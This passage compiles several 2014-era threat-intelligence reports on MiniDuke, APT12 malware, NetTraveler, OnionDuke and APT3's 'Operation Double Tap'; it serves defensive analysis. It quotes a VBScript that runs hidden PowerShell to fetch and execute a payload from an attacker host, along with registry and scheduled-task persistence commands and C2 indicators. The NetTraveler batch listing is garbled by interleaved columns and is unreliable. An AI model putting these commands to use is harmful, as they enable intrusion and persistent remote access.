attackers have the unprecedented ability to deliver malware to you through your web browser simply
because of your IP address space and your industry vertical. Most of the attacks featured here were not
detected by standard Anti-Virus because the malware hashes constantly change.
Web proxy blocking updates, even in real time, will not stop new malvertising landing pages that appear
and disappear within minutes.
Intelligence feeds from the premier intelligence providers, based on hostname, IP, URL or domain will not
be able to block malicious malvertisers quickly enough.
Invincea protected users can simply browse and click anything online without fear of compromise or
targeted malvertising attacks.
Non-Invincea users can attempt to OptOut of directed targeting where you can. European privacy laws
for forcing most ad providers to offer the opt-out service; however, you often have to visit each ad
provider individually to choose to opt out.
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                  Invincea White Paper       32
Note, that opting out merely places a blocking cookie in your browser. This means that ad providers will
not target or retarget based on cookies. But as shown above, the new targeted advertising is via IP
intelligence.
http://www.rubiconproject.com/privacy/consumer-online-profile-and-opt-out/
http://preferences-mgr.truste.com/
http://www.ghosteryenterprise.com/global-opt-out/
Release Notes
10/27: For clarification, Invincea has added additional notes in this version that the websites shown here
and the 3rd party real-time ad networks are being used unwittingly and their resources misappropriated
by malvertisers to target companies for persistent remote access, click fraud, and other nefarious
activities. This is not a reflection on these companies, nor the services they provide. This paper
highlights the problem for greater awareness so the industry collectively can combat this problem
perhaps with more effective screening at the source prior to displaying ads.
Invincea, Inc.                                                           Release Date: 10.27.2014
Miniduke still duking it out
At the end of April Microsoft announced that a vulnerability in Word was actively being exploited. This
vulnerability occurred in parsing RTF files and was assigned CVE-2014-1761, a thorough analysis of which
can be found on the HP Security Research blog. We have since seen multiple cases where this exploit is
used to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke
(also known as Win32/SandyEva).
MiniDuke was first discussed by Kaspersky in March 2013 in their paper The MiniDuke Mystery: PDF 0-
day Government Spy Assembler 0x29A Micro Backdoorand shortly after in a paper by Bitdefender. Some
of the characteristics of MiniDuke 
 such as its small size (20 KB), its crafty use of assembly
programming, and the use of zero-day exploits for distribution 
 made it an intriguing threat. Although
the backdoor is still quite similar to its previous versions, some important changes were made since last
year, the most notable being the introduction of a secondary component written in JScript to contact a
C&C server via Twitter.
The RTF exploit document
The exploit document was named Proposal-Cover-Sheet-English.rtf and is quite bland when compared to
the documents that were used in 2013, which were of a political nature. We received the document on
April 8th, only three days after the compilation of the MiniDuke payload, dated April 5th in the PE header.
The payload remains quite small at only 24 KB.
The functionality of the shellcode which is executed by triggering the vulnerability is rather simple and
straightforward. After decrypting itself and obtaining the addresses of some functions exported by
kernel32.dll, it decrypts and drops the payload in the %TEMP% directory in a file named 
 which is
subsequently loaded by calling kernel32!LoadLibraryA.
An interesting thing about the shellcode is that before transferring control to any API function it checks
the first bytes of the function in order to detect hooks and debugger breakpoints which may be set by
security software and monitoring tools. If any of these are found the shellcode skips the first 5 bytes of the
function being called by manually executing prologue instructions (mov edi, edi; push ebp; mov ebp, esp)
and then jumping to the function code as illustrated below.
The next graph presents the execution flow of this malware when the exploitation is successful. As
mentioned previously this version of the MiniDuke payload comes with two modules which we refer to as
the main module and the TwitterJS module.
Execution flow of MiniDuke
Main Component
Installation
Once MiniDuke receives control it checks that the host process is not rundll32.exe and whether the
current directory is %TEMP%. If either of those conditions is met the malware assumes it is run for the
first time and it proceeds with its installation onto the system. MiniDuke gathers information about the
system and encrypts its configuration based on that information, a method also used by OSX/Flashback
(this process is called watermarking by Bitdefender). The end result is that it is impossible to retrieve the
configuration of an encrypted payload if analyzing it on a different computer. The information collected on
infection has not changed since the previous version and consists of the following values:
      volume serial number (obtained from kernel32!GetVolumeInformationA)
      CPU information (obtained with the cpuidinstruction)
      computer name (obtained from kernel32!GetComputerNameA)
Once the encrypted version of the malware is created, it is written into a file in the
%ALLUSERSPROFILE%\Application Data directory. The name of the file is randomly picked from the
following values (you can find this listing and those of the next screenshots on the VirusRadar description:
The filename extension is also picked randomly from the following list:
To persist on the infected system after reboots, the malware creates a hidden .LNK file in the 
Startup
directory pointing to the modified main module. The name of the .LNK file is randomly drawn from the
following values:
The .LNKfile is created using a COM object with the IShellLinkA interface and contains the following
command: 
C:\Windows\system32\rundll32.exe %path_to_main_module%, export_function
 Which
gives something like:
C:\Windows\system32\rundll32.exe C:\DOCUME~1\ALLUSE~1\APPLIC~1\data.cat, IlqUenn
Operation
When the malware is loaded by rundll32.exe and the current directory isn
t %TEMP%, the malware starts
with gathering the same system information as described in the 
Installation
 section to decrypt
configuration information. As with the previous version of MiniDuke, it checks for the presence of the
following processes in the system:
If any of these are found in the system the configuration information will be decrypted incorrectly, i.e. the
malware will run on the system without any communication to C&C servers. If the configuration data is
decrypted correctly, MiniDuke retrieves the Twitter page of @FloydLSchwartz in search of URLs by
which to reach C&C server. It looks for the tag 
X)))
 on the page (MiniDuke was searching for 
uri!
previous samples) and if the tag is found it decrypts a URL from the data that follows it. The Twitter
account @FloydLSchwartz does exist but has only retweets and no strings with the special tag.
As the next step, MiniDuke gathers the following information from the infected systems:
      computer name and user domain name
      country code of the infected host IP address obtained from http://www.geoiptool.com
      OS version information
      domain controller name, user name, groups a user account belongs to
      a list of AV products installed onto the system
      Internet proxy configuration
      version of MiniDuke
This information is then sent to the C&C server along with the request to download a payload. The final
URL used to communicate with the C&C server looks like this: <url_start>/create.php?<rnd_param>=
<system_info> Those tokens are derived as follows:
      url_start 
 the URL retrieved from the twitter account
      rnd_param 
 randomly generated of lower case alphabet characters parameter name in the query
      string of the URL
      system_info 
 base64 encoded and encrypted system information
An example of such a URL is given below:
The payload is downloaded in the file named 
fdbywu
 using the urlmon!URLDownloadToFileA API:
The downloaded payload is a fake GIF8 file containing encrypted executable. The malware processes the
downloaded file in the same way as previous samples of MiniDuke: it verifies the integrity of the file using
RSA-2048, then decrypts it, stores in a file and finally executes it. The RSA-2048 public key to verify
integrity of the executable inside the GIF file is the same as in the previous version of MiniDuke.
Twitter Generation Algorithm
In the event that MiniDuke is unable to retrieve a C&C URL from this account, it generates a username to
search for based on the current date. The search query changes roughly every seven days and is similar to
the backup mechanism in previous versions that was using Google searches. A Python implementation of
the algorithm can be found in Appendix B.
TwitterJS component
The TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll, injecting a block of
code into it and redirecting the exported functions to this code. Here is how the export address table of the
patched binary looks after modifications.
This file is then stored in an Alternate Data Stream (ADS) in NTUSER.DAT in the %USERPROFILE%
folder. Finally this DLL is registered as the Open command when a drive is open, which has the effect of
starting the bot every time the user opens a disk drive. Below you can find the content of
the init.cmd script used by MiniDuke to install TwitterJS module onto the system.
When loaded, TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the
core logic of the module.
Prior to executing it, MiniDuke applies a light encoding to the script: The next images show the result of
two separate obfuscations, we can see that the variables have different values. This is probably done to
thwart security systems that scan at the entry points of the JScript engine.
Result of first obfuscation
Result of second obfuscation
The purpose of this script is to use Twitter to find a C&C and retrieve JScript code to execute. It first
generates a Twitter user to search for; this search term changes every 7 days and is actually a match to the
real account name, not the Twitter account name. The bot then visits the Twitter profiles returned by the
search and looks for links that end with 
.xhtml
. When one is found, it replaces 
.xhtml
 with 
.php
 and
fetches that link. Information about the computer is embedded in the Accept HTTP header.
The first link on the retrieved page should contain base64 data; the name attribute of the link is used as a
rolling XOR key to decrypt the JScript code. Finally, MiniDuke calculates a hash of the fetched script and
compares it with a hardcoded hash in the TwitterJS script. If they match, the fetched script is executed by
calling eval().
The tale of the broken SHA-1
The code hashing algorithm used by the component looks very much like SHA-1 but outputs different
hashes (you can find the complete implementation in Appendix B. We decided to search for what was
changed in the algorithm; one of our working hypotheses was that the algorithm might have been altered
to make collisions feasible. We couldn
t find an obvious difference; all the constants and the steps of the
algorithm were as expected. Then we noticed that for short messages only the second 32-bit word was
different when compared to the original SHA-1.
SHA1(
test
) : a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
TwitterJS_SHA1(
test
) : a94a8fe5dce4f01c1c4c0873d391e987982fbbd3
By examining how this 2nd word was generated we finally discovered that this was caused by a scope
issue. As shown below the SHA-1 function used a variable named f: the function Z() is then called which
also uses a variable named f without the var keyword, causing it to be treated as a global variable rather
than local to the function. The end result is that the value of f is also changed in the SHA-1 function which
affects the value of the 2nd word for that round and ultimately the whole hash for long messages.
                                                  A likely explanation of how this problem came to be is
                                                  that the variable names were changed to single letters
                                                  using an automated tool prior to embedding it in the
                                                  payload. The 2 f variables probably had different names
                                                  in the original script which avoided the issue. So this
                                                  leaves us with two takeaways: 1) The difference in the
                                                  hashing algorithm was unintentional and 2) Always
                                                  declare your local variables with the var keyword. ;-)
Twitter DGA accounts
We generated the list of Twitter search terms for 2013-2014 and checked if any of those were registered.
At the moment only one exists, @AA2ADcAOAA, which is the TwitterJS account that was generated
between August 21st and 27th 2013. This account has no tweets. In an effort to discover potential victims,
we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS
components and set up tweets with encrypted URLs so that an infected computer would reach out to our
server. So far we have received connections via the TwitterJS accounts from four computers located in
Belgium, France and the UK. We have contacted national CERTs to notify the affected parties. We detect
the RTF exploit document as Win32/Exploit.CVE-2014-1761.D and the MiniDuke components
as Win32/SandyEva.G.
Appendix A: SHA-1 hashes
 SHA-1                                            Description
 58be4918df7fbf1e12de1a31d4f622e570a81b93         RTF with Word exploit CVE-2014-1761
 b27f6174173e71dc154413a525baddf3d6dea1fd      MiniDuke main component (before config encryption)
 c059303cd420dc892421ba4465f09b892de93c77      TwitterJS javascript code
Appendix B &C: DGA algorithms, Twitter DGA accounts
The DGA scripts and account lists have been moved to our Github account :
https://github.com/eset/malware-research/tree/master/miniduke
Author ESET Research, ESET
Survival of the Fittest: New York Times Attackers Evolve Quickly
The attackers behind the breach of the New York Times
 computer network late last year appear to be
mounting fresh assaults that leverage new and improved versions of malware.
The new campaigns mark the first significant stirrings from the group since it went silent in January in the
wake of a detailed expose of the group and its exploits 
 and a retooling of what security researchers
believe is a massive spying operation based in China [1].
The newest campaign uses updated versions of Aumlib and Ixeshe.
Aumlib, which for years has been used in targeted attacks, now encodes certain HTTP communications.
FireEye researchers spotted the malware when analyzing a recent attempted attack on an organization
involved in shaping economic policy.
And a new version of Ixeshe, which has been in service since 2009 to attack targets in East Asia, uses new
network traffic patterns, possibly to evade traditional network security systems.
The updates are significant for both of the longstanding malware families; before this year, Aumlib had
not changed since at least May 2011, and Ixeshe had not evolved since at least December 2011.
BACKGROUND
Cybercriminals are constantly evolving and adapting in their attempts to bypass computer network
defenses. But, larger, more successful threat actors tend to evolve at a slower rate.
As long as these actors regularly achieve their objective (stealing sensitive data), they are not motivated to
update or rethink their techniques, tactics, or procedures (TTPs). These threat actors
 tactics follow the
same principles of evolution 
 successful techniques propagate, and unsuccessful ones are abandoned.
Attackers do not change their approach unless an external force or environmental shift compels them to.
As the old saying goes: If it ain
t broke, don
t fix it.
So when a larger, successful threat actor changes up tactics, the move always piques our attention.
Naturally, our first priority is ensuring that we detect the new or altered TTPs. But we also attempt to
figure out why the adversary changed 
 what broke? 
 so that we can predict if and when they will
change again in the future.
We observed an example of this phenomenon around May. About four months after The New York Times
publicized an attack on its network, the attackers behind the intrusion deployed updated versions of their
Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families [2].
The previous versions of Aumlib had not changed since at least May 2011, and Ixeshe had not evolved
since at least December 2011.
We cannot say for sure whether the attackers were responding to the scrutiny they received in the wake of
the episode. But we do know the change was sudden. Akin to turning a battleship, retooling TTPs of large
threat actors is formidable. Such a move requires recoding malware, updating infrastructure, and possibly
retraining workers on new processes.
The following sections detail the changes to Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe.
Backdoor.APT.Aumlib
Aumlib has been used in targeted attacks for years. Older variants of this malware family generated the
following POST request:
POST /bbs/info.asp HTTP/1.1
Data sent via this POST request transmitted in clear text in the following structure:
<VICTIM BIOS NAME>|<CAMPAIGN ID>|<VICTIM EXTERNAL IP>|<VICTIM OS>|
A recently observed malware sample (hash value 832f5e01be536da71d5b3f7e41938cfb) appears to be a
modified variant of Aumlib.
The sample, which was deployed against an organization involved in shaping economic policy, was
downloaded from the following URL:
status[.]acmetoy[.]com/DD/myScript.js or status[.]acmetoy[.]com/DD/css.css
The sample generated the following traffic:
This output reveals the following changes when compared with earlier variants:
      The POST URI is changed to /bbs/search.asp (as mentioned, earlier Aumlib variants used a POST
      URI of /bbs/info.asp.)
      The POST body is now encoded.
Additional requests from the sample generated the following traffic:
These subtle changes may be enough to circumvent existing IDS signatures designed to detect older
variants of the Aumlib family.
The sample 832f5e01be536da71d5b3f7e41938cfb shares code with an older Aumlib variant with the hash
cb3dcde34fd9ff0e19381d99b02f9692. The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to
documents[.]myPicture[.]info and www[.]documents[.]myPicture[.]info and as expected generated the a
POST request to /bbs/info.asp.
Backdoor.APT.Ixeshe
Ixeshe has been used in targeted attacks since 2009, often against entities in East Asia [3]. Although the
network traffic is encoded with a custom Base64 alphabet, the URI pattern has been largely consistent:
/[ACD] [EW]S[Numbers].jsp?[Base64]
We analyzed a recent sample that appears to have targeted entities in Taiwan, a target consistent with
previous Ixeshe activity.
This sample (aa873ed803ca800ce92a39d9a683c644) exhibited network traffic that does not match the
earlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe
related infections.
The Base64-encoded data still contains information including the victim
s hostname and IP address but
also a 
mark
 or 
campaign tag/code
 that the threat actors use to keep track of their various attacks. The
mark for this particular attack was [ll65].
CONCLUSION
Based on our observations, the most successful threat actors evolve slowly and deliberately. So when they
do change, pay close attention. Knowing how attackers
 strategy is shifting is crucial to detecting and
defending against today
s advanced threats. But knowing the 
 is equally important. That additional
degree of understanding can help organizations forecast when and how a threat actor might change their
behavior 
 because if you successfully foil their attacks, they probably will.
Notes
[1] http://www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times-
computers.html?pagewanted=all
[2] This actor is known as APT12 by Mandiant
[3] http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-
papers/wp_ixeshe.pdf
This entry was posted in Threat Intelligence, Threat Research by Ned Moran and Nart Villeneuve.
Bookmark the permalink.
NetTraveler APT Gets a Makeover for 10th Birthday
We have written about NetTraveler before HERE and HERE.
Earlier this year, we observed an uptick in the number of attacks against Uyghur and Tibetan supporters
using an updated version of the NetTraveler backdoor.
Here's an example of a targeted spear-phishing e-mail directed at Uyghur activists in March 2014.
The e-mail has two attachments, a non-malicious JPG file and a 373 KB Microsoft Word .DOC file.
                                      "Sabiq sot xadimi gulnar abletning qeyin-Qistaqta olgenliki
            File name
                                      ashkarilanmaqta.doc"
            MD5                       b2385963d3afece16bd7478b4cf290ce
            Size                      381,667 bytes
The .DOC file, which in reality is a "Single File Web Page" container, also known as "Web archive file",
appears to have been created on a system using Microsoft Office - Simplified Chinese.
It contains an exploit for the CVE-2012-0158 vulnerability, detected by Kaspersky Lab products as
Exploit.MSWord.CVE-2012-0158.db.
If run on a vulnerable version of Microsoft Office, it drops the main module as "net.exe" (detected by
Kaspersky Lab products as Trojan-Dropper.Win32.Agent.lifr), which in turn installs a number of
other files. The main C&C module is dumped into
"%SystemRoot%\system32\Windowsupdataney.dll", (detected by Kaspersky as Trojan-
Spy.Win32.TravNet.qfr).
           Name                      WINDOWSUPDATANEY.DLL
           MD5                       c13c79ad874215cfec8d318468e3d116
           Size                      37,888 bytes
It is registered as a service (named "Windowsupdata") through a Windows Batch file named "DOT.BAT"
(detected by Kaspersky Lab products as Trojan.BAT.Tiny.b):
 @echo off
 @reg add
 "HKEY_LOCAL_MACHINE\
 SOFTWARE\Microsoft\Win
 dows@echo off
 NT\CurrentVersion\Svcho
 st" @reg
     /v Windowsupdata     /t
            add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows           NT\CurrentVersion\Svchost" /v
 REG_MULTI_SZ /d
     Windowsupdata
 Windowsupdata /f
                          /t REG_MULTI_SZ   /d Windowsupdata /f
 @reg add
     @reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata" /v
 "HKEY_LOCAL_MACHINE\
     ImagePath /t REG_EXPAND_SZ /d %SystemRoot%\System32\svchost.exe -k Windowsupdata /f
 SYSTEM\CurrentControlSe
 t\Services\Windowsupdat
 a" /v ImagePath
     @reg          /t
            add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata"        /v
 REG_EXPAND_SZ /d
     DisplayName
 %SystemRoot%\System32
                       /t REG_SZ /d Windowsupdata  /f
 \svchost.exe -k
     @reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata"
 Windowsupdata     /f                                                                       /v
 @regObjectName
        add           /t REG_SZ /d LocalSystem /f
 "HKEY_LOCAL_MACHINE\
 SYSTEM\CurrentControlSe
     @reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata" /v
 t\Services\Windowsupdat
     ErrorControl /t REG_DWORD /d 1 /f
 a" /v DisplayName /t
 REG_SZ /d
     @reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata"
 Windowsupdata     /f                                                                       /v Start /t
 @regREG_DWORD
        add              /d 2 /f
 "HKEY_LOCAL_MACHINE\
 SYSTEM\CurrentControlSe
     @reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windowsupdata\Parameters"
 t\Services\Windowsupdat
     /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\Windowsupdataney.dll /f
 a" /v ObjectName /t
 REG_SZ /d LocalSystem /f
 @reg add
To   make sure the malware isn't running multiple times, it uses the mutex "SD_2013 Is Running!" to mark
 "HKEY_LOCAL_MACHINE\
 SYSTEM\CurrentControlSe
its presence in the system. Other known mutexes used by older and current variants include:
 t\Services\Windowsupdat
 a" /v ErrorControl /t
 REG_DWORD /d 1 /f
 @reg addBoat-12 Is Running!
 "HKEY_LOCAL_MACHINE\
         DocHunter2012 Is Running!
 SYSTEM\CurrentControlSe
 t\Services\Windowsupdat
         Hunter-2012 Is Running!
 a" /v Start /t REG_DWORD
 /d 2 /fNT-2012 Is Running!
 @reg add
 "HKEY_LOCAL_MACHINE\
      NetTravler Is Running!
      NetTravler2012 Is Running!
      SH-2011 Is Running!
      ShengHai Is Running!
      SD2013 is Running!
The malware configuration file is written to the "SYSTEM" folder (as opposed to SYSTEM32) and has a
slightly new format compared to "older" NetTraveler samples:
For the record, here's what an older NetTraveler config file looks like:
Obviously, the developers behind NetTraveler have taken steps to try to hide the malware's configuration.
Luckily, the encryption is relatively simple to break.
The algorithm is as follows:
for (i=0;i<string_size;i++)
decrypted[i]=encrypted[i] - (i + 0xa);
Once decrypted, the new config looks like this:
One can easily see the command-and-control (C&C) server in the screenshot above, which is
"uyghurinfo[.]com".
We identified several samples using this new encryption scheme. A list of all the extracted C&C servers can
be found below:
 C&C server            IP                   IP location                      Registrar
                                            Hong Kong, Albert Heng,          SHANGHAI MEICHENG
 ssdcru[.]com          103.30.7.77
                                            Trillion Company                 TECHNOLOGY
                                            United States, Los Angeles,      TODAYNIC.COM
 uygurinfo[.]com       216.83.32.29
                                            Integen Inc                      INC.
                                            Hong Kong, Kowloon,
                                                                             SHANGHAI MEICHENG
 samedone[.]com        122.10.17.130        Hongkong Dingfengxinhui Bgp
                                                                             TECHNOLOGY
                                            Datacenter
                                            Hong Kong, Sun Network           SHANGHAI MEICHENG
 gobackto[.]net        103.1.42.1
                                            (hong Kong) Limited              TECHNOLOGY
                                                                             SHANGHAI MEICHENG
 worksware[.]net       N/A                  N/A
                                                                             TECHNOLOGY
                       was                  Hong Kong, Sun Network           SHANGHAI MEICHENG
 jojomic[.]com
                       202.146.219.14       (hong Kong) Limited              TECHNOLOGY
                                            hong kong hung tai               SHANGHAI MEICHENG
 angellost[.]net       was 103.17.117.201
                                            international holdings           TECHNOLOGY
                                            hong kong hung tai               SHANGHAI MEICHENG
 husden[.]com          was 103.30.7.76
                                            international holdings           TECHNOLOGY
We recommend blocking all these hosts in your firewall.
Conclusion
This year, the actors behind NetTraveler celebrate 10 years of activity. Although the earliest samples we
have seen appear to have been compiled in 2005, there are certain indicators that point to 2004 as the
year when their activity started.
For 10 years NetTraveler has been targeting various sectors, with a focus on diplomatic, government and
military targets.
NetTraveler victims by industry
Most recently, the main focus of interest for cyber-espionage activities revolved around space exploration,
nano-technology, energy production, nuclear power, lasers, medicine and communications.
The targeting of Uyghur and Tibetan activists remains a standard component of their activities and we can
assume it will stay this way, perhaps for another 10 years.
OnionDuke: APT Attacks Via the Tor Network - F-Secure Weblog :
News from the Lab
Recently, research was published identifying a Tor exit node, located in Russia, that was consistently and
maliciously modifying any uncompressed Windows executables downloaded through it. Naturally this
piqued our interest, so we decided to peer down the rabbit hole. Suffice to say, the hole was a lot deeper
than we expected! In fact, it went all the way back to the notorious Russian APT family MiniDuke, known
to have been used in targeted attacks against NATO and European government agencies. The malware
used in this case is, however, not a version of MiniDuke. It is instead a separate, distinct family of malware
that we have since taken to calling OnionDuke. But lets start from the beginning.
When a user attempts to download an executable via the malicious Tor exit node, what they actually
receive is an executable "wrapper" that embeds both the original executable and a second, malicious
executable. By using a separate wrapper, the malicious actors are able to bypass any integrity checks the
original binary might contain. Upon execution, the wrapper will proceed to write to disk and execute the
original executable, thereby tricking the user into believing that everything went fine. However, the
wrapper will also write to disk and execute the second executable. In all the cases we have observed, this
malicious executable has been the same binary (SHA1: a75995f94854dea8799650a2f4a97980b71199d2,
detected as Trojan-Dropper:W32/OnionDuke.A). This executable is a dropper containing a PE
resource that pretends to be an embedded GIF image file. In reality, the resource is actually an encrypted
dynamically linked library (DLL) file. The dropper will proceed to decrypt this DLL, write it to disk and
execute it.
A flowchart of the infection process
Once executed, the DLL file (SHA1: b491c14d8cfb48636f6095b7b16555e9a575d57f, detected as
Backdoor:W32/OnionDuke.B) will decrypt an embedded configuration (shown below) and attempt to
connect to hardcoded C&C URLs specified in the configuration data. From these C&Cs the malware may
receive instructions to download and execute additional malicious components. It should be noted, that
we believe all five domains contacted by the malware are innocent websites compromised by the malware
operators, not dedicated malicious servers.
A screenshot of the embedded configuration data
Through our research, we have also been able to identify multiple other components of the OnionDuke
malware family. We have, for instance, observed components dedicated to stealing login credentials from
the victim machine and components dedicated to gathering further information on the compromised
system like the presence of antivirus software or a firewall. Some of these components have been observed
being downloaded and executed by the original backdoor process but for other components, we have yet to
identify the infection vector. Most of these components don't embed their own C&C information but
rather communicate with their controllers through the original backdoor process.
One component, however, is an interesting exception. This DLL file (SHA1
d433f281cf56015941a1c2cb87066ca62ea1db37, detected as Backdoor:W32/OnionDuke.A) contains
among its configuration data a different hardcoded C&C domain, overpict.com and also evidence
suggesting that this component may abuse Twitter as an additional C&C channel. What makes the
overpict.com domain interesting, is it was originally registered in 2011 with the alias of "John Kasai".
Within a two-week window, "John Kasai" also registered the following domains: airtravelabroad.com,
beijingnewsblog.net, grouptumbler.com, leveldelta.com, nasdaqblog.net, natureinhome.com,
nestedmail.com, nostressjob.com, nytunion.com, oilnewsblog.com, sixsquare.net and ustradecomp.com.
This is significant because the domains leveldelta.com and grouptumbler.com have previously been
identified as C&C domains used by MiniDuke. This strongly suggests that although OnionDuke and
MiniDuke are two separate families of malware, the actors behind them are connected through the use of
shared infrastructure.
A visualization of the infrastructure shared between OnionDuke and MiniDuke
Based on compilation timestamps and discovery dates of samples we have observed, we believe the
OnionDuke operators have been infecting downloaded executables at least since the end of October 2013.
We also have evidence suggesting that, at least since February of 2014, OnionDuke has not only been
spread by modifying downloaded executables but also by infecting executables in .torrent files containing
pirated software. However, it would seem that the OnionDuke family is much older, both based on older
compilation timestamps and also on the fact that some of the embedded configuration data make
reference to an apparent version number of 4 suggesting that at least three earlier versions of the family
exist.
During our research, we have also uncovered strong evidence suggesting that OnionDuke has been used in
targeted attacks against European government agencies, although we have so far been unable to identify
the infection vector(s). Interestingly, this would suggest two very different targeting strategies. On one
hand is the "shooting a fly with a cannon" mass-infection strategy through modified binaries and, on the
other, the more surgical targeting traditionally associated with APT operations.
In any case, although much is still shrouded in mystery and speculation, one thing is certain. While using
Tor may help you stay anonymous, it does at the same time paint a huge target on your back. It's never a
good idea to download binaries via Tor (or anything else) without encryption. The problem with Tor is
that you have no idea who is maintaining the exit node you are using and what their motives are. VPNs
(such as our Freedome VPN) will encrypt your connection all the way through the Tor network, so the
maintainers of Tor exit nodes will not see your traffic and can't tamper with it.
Samples:
 a75995f94854dea8799650a2f4a97980b71199d2
 b491c14d8cfb48636f6095b7b16555e9a575d57f
 d433f281cf56015941a1c2cb87066ca62ea1db37
Detected as: Trojan-Dropper:W32/OnionDuke.A, Backdoor:W32/OnionDuke.A, and
Backdoor:W32/OnionDuke.B.
Post by 
 Artturi (@lehtior2)
Operation Double Tap
APT3 (also known as UPS), the actors responsible for Operation Clandestine Fox has quietly continued to
send waves of spearphishing messages over the past few months. This actor initiated their most recent
campaign on November 19, 2014 targeting multiple organizations. The attacker leveraged multiple
exploits, targeting both CVE-2014-6332 and CVE-2014-4113. CVE-2014-6332 was disclosed publicly on
2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability. CVE-2014-
4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14.
The use of CVE-2014-6332 is notable, as it demonstrates that multiple classes of actors, both criminal and
APT alike, have now incorporated this exploit into their toolkits. Further, the use of both of these two
known vulnerabilities in tandem is notable for APT3. This actor is historically known for leveraging zero-
day vulnerabilities in widespread but infrequent phishing campaigns. The use of known exploits and more
frequent attacks may indicate both a shift in strategy and operational tempo for this group.
The Spearphish
The body of the message is below:
One Month's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS
4,000 MODELS Nude Celebrities,Playmates,Cybergirls & More! Click
hxxp://join.playboysplus.com/signup/ To Get a Free Plus Member Now & Never Miss Another Update.
Your Member referrals must remain active. If anyone getting "Promotion not available" for 1 month free
membership, you might get the issue up to 48 hrs once your membership is expired and make sure to
Clear out cookies or use another browser or use another PC.
The webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the
affected users
 system to download the below payload:
  function runmumaa()
  On Error Resume Next
  set shell=createobject("Shell.Application")
  shell.ShellExecute "powershell.exe","-NoLogo -NoProfile             -NonInteractive -WindowStyle
Hidden ( New-Object
System.Net.WebClient
).DownloadFile(
http://www.playboysplus.com
/install/install.exe
install.exe
);Invoke-Item install.exe", "",   "open", 1
  end function
The CVE-2014-6332 exploit code seen in this incident is derived from the code published at
http://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project.
The Downloader
After the exploit or script executes, the system downloads install.exe, which has the following metadata:
MD5           5a0c4e1925c76a959ab0588f683ab437
Size         46592 bytes
Compile Time 2014-11-19 08:55:10Z
Import Hash      6b8611f8148a6b51e37fd68e75b6a81c
The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path
C:\Users\Public
, which fails on Windows XP because that path is not present by default.
The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe
with the elevated privileges. These files have the following metadata:
doc.exe (x86):
MD5          492a839a3bf9c61b7065589a18c5aa8d
Size        12288 bytes
Import Hash 9342d18e7d315117f23db7553d59a9d1
doc.exe (x64):
MD5          744a17a3bc6dbd535f568ef1e87d8b9a
Size        13824 bytes
Compile Time 2014-11-19 08:25:45Z
Import Hash 2fab77a3ff40e4f6d9b5b7e813c618e4
test.exe:
MD5            5c08957f05377004376e6a622406f9aa
Size        11264 bytes
Compile Time 2014-11-18 10:49:23Z
Import Hash f34d5f2d4577ed6d9ceec516c1f5a744
These payload files also have interesting PDB debug strings.
install.exe:
  c:\Users\aa\Documents\Visual Studio 2008\Projects\MShell\Release             \MShell.pdb
doc.exe:
  c:\Users\aa\Documents\Visual Studio 2008\Projects\4113\Release               \4113.pdb
test.exe:
  C:\Users\aa\Documents\Visual Studio 2010\Projects\MyRat\Client\Client
\obj\x86\Release\Client.pdb
The most interesting PDB string is the 
4113.pdb,
 which appears to reference CVE-2014-4113. This CVE is
a local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the
machine.
The malware component, test.exe, uses the Windows command "cmd.exe" /C whoami
 to verify it is
running with the elevated privileges of 
System
 and creates persistence by creating the following
scheduled task:
  schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON         /ru "System"
When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port
1913. The malware sends the SOCKS5 connection request "05 01 00" and verifies the server response
starts with "05 00". The malware then requests a connection to 192.184.60.229 on TCP port 81 using the
command "05 01 00 01 c0 b8 3c e5 00 51" and verifies that the first two bytes from the server are "05 00"
(c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order).
Once the connection to the server is established, the malware expects a message containing at least three
bytes from the server. These first three bytes are the command identifier. The following commands are
supported by the malware:
 Command       Description
 00 00 00      Content after command ID is written to:
               C:\Users\
               [Username]\AppData\Local\Temp\notepad1.exe
 00 00 01      Deletes the files:
               C:\Users\
               [Username]\AppData\Local\Temp\notepad.exe
               C:\Users\
               [Username]\AppData\Local\Temp\newnotepad.exe
 00 00 02      Malware exits
 00 00 03      Malware downloads the URL that follows the
               command ID. The file is saved to:
               C:\Users\
               [Username]\AppData\Local\Temp\notepad.exe
 00 00 04      Content after command ID is written to:
               C:\Users\
               [Username]\AppData\Local\Temp\notepad2.exe
 00 00 05      The files notepad1.exe and notepad2.exe are
               concatenated together and written to C:\Users\
               [Username]\AppData\Local\Temp\newnotepad.exe
               and executed
 00 00 06      The contents of the following file is sent to the
               server:
               C:\Users\
               [Username]\AppData\Local\Temp\note.txt
 00 00 07      The string following the command ID is executed
               using "cmd /C" and results are sent to server
Links to APT3
